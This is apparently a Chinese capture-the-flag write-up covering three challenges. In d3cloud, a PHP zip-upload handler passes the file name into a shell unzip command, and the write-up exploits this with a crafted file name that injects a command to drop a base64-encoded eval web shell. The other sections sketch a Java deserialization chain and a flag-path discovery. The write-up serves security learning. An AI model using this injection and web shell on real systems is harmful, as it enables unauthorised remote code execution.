## Web
### d3cloud
访问/admin后台 admin:admin登录管理员账号
在侧边栏有文件管理，可以上传zip包，同时下载文件`FilesystemAdapter.php`
对文件进行代码审计后,在这里的解压存在命令注入

```php
public function putFileAs($path, $file, $name, $options = [])
    {
        $supported_file = array('gif','jpg','jpeg','png','ico','zip','mp4','mp3','mkv','avi','txt');
        $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));
        if (!in_array($file_type, $supported_file)) {
            return false;
        }
        $stream = fopen($file->getRealPath(), 'r+');
        $result = $this->put(
            $path = trim($path.'/'.$name, '/'), $stream, $options
        );
        if (is_resource($stream)) {
            fclose($stream);
        }
        if($file->getClientOriginalExtension() === "zip") {
            $fs = popen("unzip -oq ". $this->driver->getAdapter()->getPathPrefix() . $name ." -d " . $this->driver->getAdapter()->getPathPrefix(),"w");
            pclose($fs);
        }
        return $result ? $path : false;
    }
```

`1.zip || echo PD9waHAgZXZhbCgkX1JFUVVFU1RbInd1d3Vtb25zdGVyIl0pO3BocGluZm8oKTs= | base64 -d > shell.php # .zip`

![](attachments/Pasted%20image%2020230506152056.png)


直接访问shell.php

![](attachments/Pasted%20image%2020230506152206.png)

### Ezjava
在register里有hessian2的反序列化位置

![](attachments/Pasted%20image%2020230511133049.png)

在源码里面是可以看到flag自身是在server中的，server中代码和依赖有很明显的fastjson2，fastjson2的触发任意getter[FastJson 与原生反序列化 (seebug.org)](https://paper.seebug.org/2055/)


![](attachments/Pasted%20image%2020230511133608.png)



## Misc
### d3readfile
在一个日志文件里面发现了有下载locate的历史记录，后面把locate拖出来做逆向

![](attachments/Pasted%20image%2020230503132422.png)

读取对应路径后发现

![](attachments/Pasted%20image%2020230503133013.png)

去除！后 `/opt/vwMDP4unF4cvqHrztduv4hpCw9H9Sdfh/UuRez4TstSQEXZpK74VoKWQc2KBubVZi/LcXAfeaD2KLrV8zBpuPdgsbVpGqLcykz/flag_1s_h3re_233`

![](attachments/Pasted%20image%2020230503133245.png)
